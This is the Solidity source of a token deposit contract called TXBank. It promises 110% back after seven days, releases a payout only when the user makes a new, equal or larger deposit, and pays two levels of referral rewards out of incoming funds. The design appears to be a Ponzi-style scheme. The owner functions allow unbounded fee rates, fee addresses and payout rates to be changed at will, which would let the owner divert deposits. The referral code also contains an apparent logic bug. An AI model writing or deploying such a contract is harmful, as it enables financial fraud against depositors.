//SourceUnit: TXBank.sol

// SPDX-License-Identifier: MIT
pragma solidity >=0.8.4;

interface IERC20 {
    function decimals() external view returns (uint8);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

contract TXBank {
    address private owner;

    uint256 public INTERVAL_TIMES = 7 days;
    uint256 public DEPOSIT_GAP_TIME = 24 hours;
    uint256 public BACK_RATE = 110;
    uint256 public EXPIRED_TIME = 11 days;

    struct Deposit {
        uint256 time;
        uint256 amount;
        bool withdrawed;
        uint256 backAmount;
    }

    struct Deposits {
        Deposit[] deposits;
        uint256 withdrawIndex;
    }

    mapping(address => Deposits) public userDeposits;
    mapping(address => address) public refs;
    mapping(address => uint256) public _totalDepositAmount;
    mapping(address => uint256) public _totalWithdrawAmount;
    mapping(address => uint256) public _totalADepositAmount;

    uint256 public userCount;
    uint256 public minAmount = 10;
    uint256 public maxAmount = 1000;

    address public feeAddress1;
    uint256 public feeRate1;
    address public feeAddress2;
    uint256 public feeRate2;

    uint256 public refFeeRate1 = 10;
    uint256 public refFeeRate2 = 10;

    uint256 public expiredRate = 30;
    uint256 public loveReturnRate = 70;

    IERC20 public Token;
    uint256 public withdrawRate;

    modifier onlyOwner() {
        require(owner == msg.sender, "auth");
        _;
    }

    constructor(
        address _Token
    ) {
        owner = msg.sender;
        Token = IERC20(_Token);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

    function deposit(address ref, uint256 amount) external {
        require(
            (amount >= minAmount * 10 ** Token.decimals()) && (amount <= maxAmount * 10 ** Token.decimals()),
            "ERR: 0"
        );
        require(
            Token.transferFrom(msg.sender, address(this), amount),
            "transfer token error"
        );

        require(ref != msg.sender, "ERR: 1");
        if (refs[msg.sender] == address(0)) {
            require(
                userDeposits[ref].deposits.length > 0 || ref == address(this),
                "ERR: 2"
            );
            refs[msg.sender] = ref;
        }

        if (userDeposits[msg.sender].deposits.length > 0) {
            require(
                block.timestamp >=
                    (userDeposits[msg.sender]
                        .deposits[userDeposits[msg.sender].deposits.length - 1]
                        .time + DEPOSIT_GAP_TIME),
                "ERR: 3"
            );
        }

        if (userDeposits[msg.sender].deposits.length == 0) {
            userCount++;
            address ref1 = address(refs[msg.sender]);
            if (ref1 != address(0)) {
                uint256 amount2 = amount;
                if (ref1 != address(this)) {
                    (uint256 amount1, , , ) = getWithDrawDeposit(ref1);
                    amount2 = min(amount1, amount);
                }
                safeTransfer(ref1, (amount2 * refFeeRate1) / 100);
            }

            address ref2 = address(refs[ref1]);
            if (ref2 != address(0)) {
                uint256 amount2 = amount;
                if (ref1 != address(this)) {
                    (uint256 amount1, , , ) = getWithDrawDeposit(ref2);
                    amount2 = min(amount1, amount);
                }
                safeTransfer(ref2, (amount2 * refFeeRate2) / 100);
            }
        }

        // push
        userDeposits[msg.sender].deposits.push(
            Deposit({
                time: block.timestamp,
                amount: amount,
                withdrawed: false,
                backAmount: 0
            })
        );

        _totalADepositAmount[msg.sender] += amount;

        if (address(feeAddress1) != address(0) && feeRate1 > 0) {
            safeTransfer(feeAddress1, (amount * feeRate1) / 100);
        }

        if (address(feeAddress2) != address(0) && feeRate2 > 0) {
            safeTransfer(feeAddress2, (amount * feeRate2) / 100);
        }

        if (userDeposits[msg.sender].deposits.length > 1) {
            //check lastone between withdrawIndex
            Deposit storage withdrawDeposit = userDeposits[msg.sender].deposits[
                userDeposits[msg.sender].withdrawIndex
            ];
            require(!withdrawDeposit.withdrawed, "already withdraw");

            if (amount >= withdrawDeposit.amount) {
                //time check
                if (
                    block.timestamp >=
                    (withdrawDeposit.time + INTERVAL_TIMES) &&
                    block.timestamp <= (withdrawDeposit.time + EXPIRED_TIME)
                ) {
                    uint256 backAmount = (withdrawDeposit.amount * BACK_RATE) /
                        100;
                    if (contractBalance() >= backAmount) {
                        //balance check
                        if (
                            (((totalDepositAmount(msg.sender) -
                                withdrawDeposit.amount) * withdrawRate) / 100) +
                                (_totalDepositAmount[msg.sender] + amount) >=
                            (_totalWithdrawAmount[msg.sender] + backAmount)
                        ) {
                            // all passed!
                            withdrawInternal(
                                msg.sender,
                                backAmount,
                                withdrawDeposit
                            );
                        } else {
                            withdrawInternal(
                                msg.sender,
                                (withdrawDeposit.amount * expiredRate) / 100,
                                withdrawDeposit
                            );
                        }
                    } else {
                        withdrawInternal(
                            msg.sender,
                            (withdrawDeposit.amount * loveReturnRate) / 100,
                            withdrawDeposit
                        );
                    }
                } else if (
                    block.timestamp > (withdrawDeposit.time + EXPIRED_TIME)
                ) {
                    withdrawInternal(
                        msg.sender,
                        (withdrawDeposit.amount * expiredRate) / 100,
                        withdrawDeposit
                    );
                }
            }
        }

        _totalDepositAmount[msg.sender] += amount;
    }

    function withdrawInternal(
        address user,
        uint256 backAmount,
        Deposit storage withdrawDeposit
    ) internal {
        userDeposits[user].withdrawIndex++;
        withdrawDeposit.withdrawed = true;
        withdrawDeposit.backAmount = backAmount;
        _totalADepositAmount[user] -= withdrawDeposit.amount;
        _totalWithdrawAmount[user] += backAmount;
        safeTransfer(user, backAmount);
    }

    function getWithDrawDeposit(address user)
        public
        view
        returns (
            uint256 amount,
            uint256 time,
            bool withdrawed,
            uint256 backAmount
        )
    {
        return getWithdrawInfo(user, userDeposits[user].withdrawIndex);
    }

    function getWithdrawIndex(address user) public view returns (uint256) {
        return userDeposits[user].withdrawIndex;
    }

    function getWithdrawInfo(address user, uint256 index)
        public
        view
        returns (
            uint256 amount,
            uint256 time,
            bool withdrawed,
            uint256 backAmount
        )
    {
        if (index >= 0 && index < userDeposits[user].deposits.length) {
            Deposit memory info = userDeposits[user].deposits[index];
            return (info.amount, info.time, info.withdrawed, info.backAmount);
        }
        return (0, 0, false, 0);
    }

    function totalDeposit(address user) public view returns (uint256) {
        return userDeposits[user].deposits.length;
    }

    function checkRefValid(address ref) public view returns (bool) {
        return userDeposits[ref].deposits.length > 0 || ref == address(this);
    }

    function totalDepositAmount(address user) public view returns (uint256) {
        return _totalADepositAmount[user];
    }

    function contractBalance() public view returns (uint256) {
        return Token.balanceOf(address(this));
    }

    function myBalance() public view returns (uint256) {
        return Token.balanceOf(address(msg.sender));
    }

    function leftTime() public view returns (uint256) {
        if (userDeposits[msg.sender].deposits.length > 0) {
            Deposit memory lastDeposit = userDeposits[msg.sender].deposits[
                userDeposits[msg.sender].deposits.length - 1
            ];
            if (DEPOSIT_GAP_TIME > (block.timestamp - lastDeposit.time)) {
                return DEPOSIT_GAP_TIME - (block.timestamp - lastDeposit.time);
            }
        }
        return 0;
    }

    function safeTransfer(address receipt, uint256 amount) private {
        if (amount > 0 && address(this) != receipt) {
            Token.transfer(receipt, amount);
        }
    }

    // ------------- owner -------------------------------------------------
    function setMinAmount(uint256 _minAmount) public onlyOwner {
        minAmount = _minAmount;
    }

    function setMaxAmount(uint256 _maxAmount) public onlyOwner {
        maxAmount = _maxAmount;
    }

    function setProjectAddressAndFee1(address _feeAddress, uint256 fee)
        public
        onlyOwner
    {
        feeAddress1 = _feeAddress;
        feeRate1 = fee;
    }

    function setProjectAddressAndFee2(address _feeAddress, uint256 fee)
        public
        onlyOwner
    {
        feeAddress2 = _feeAddress;
        feeRate2 = fee;
    }

    function setWithdrawRate(uint256 rate) external onlyOwner {
        withdrawRate = rate;
    }

    function transferOwner(address newOwner) external onlyOwner {
        owner = newOwner;
    }

    function setAll(
        uint256 _depositGapTime,
        uint256 _intervalTime,
        uint256 _backRate,
        uint256 _expireTime,
        uint256 _expiredRate,
        uint256 _loveReturnRate,
        uint256 _refFeeRate1,
        uint256 _refFeeRate2
    ) external onlyOwner {
        DEPOSIT_GAP_TIME = _depositGapTime;
        INTERVAL_TIMES = _intervalTime;
        BACK_RATE = _backRate;
        EXPIRED_TIME = _expireTime;
        expiredRate = _expiredRate;
        loveReturnRate = _loveReturnRate;
        refFeeRate1 = _refFeeRate1;
        refFeeRate2 = _refFeeRate2;
    }

    receive() external payable {}
}